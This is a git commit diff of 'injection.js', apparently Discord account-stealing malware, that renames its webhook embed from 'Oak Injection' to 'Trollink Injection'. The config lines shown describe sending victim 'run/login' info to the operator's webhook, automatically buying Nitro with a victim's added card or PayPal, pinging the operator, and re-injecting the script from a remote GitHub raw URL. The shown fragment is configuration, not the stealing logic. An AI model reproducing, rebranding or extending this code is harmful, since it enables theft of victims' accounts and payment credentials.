b75cc40133bfbd8009df1ee86771134a1b3453e9
w2rr2w2 <155772942+w2rr2w2@users.noreply.github.com>
2024-03-25 10:04:32 +0000

    Update injection.js

--- injection.js
+++ injection.js
@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Oak Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://i.imgur.com/bbWgtHI.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_name: 'Trollink Injection', //name of the webhook thats gonna send the info
+  embed_icon: 'https://imgur.com/a/C1tQeMY', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/w2rr2w2/trollink-injection/main/injection.js', //injection url for when it reinjects
   /**
